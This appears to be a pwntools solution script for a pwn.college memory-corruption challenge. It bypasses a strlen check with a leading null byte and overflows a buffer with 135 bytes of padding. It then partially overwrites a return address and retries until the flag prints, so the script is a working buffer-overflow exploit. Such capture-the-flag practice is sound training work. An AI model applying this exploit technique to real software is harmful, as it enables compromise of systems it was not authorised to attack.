# https://www.man7.org/linux/man-pages/man3/strlen.3.html
from pwn import *

while True:
    p = process('/challenge/babymem-level-8-0')

    p.recvuntil('Payload size:')
    p.sendline(b'200')

    payload = b'\0' + b'A' * 135 + p16(0xcdaf)

    #p.recvline('Send your payload')
    p.send(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
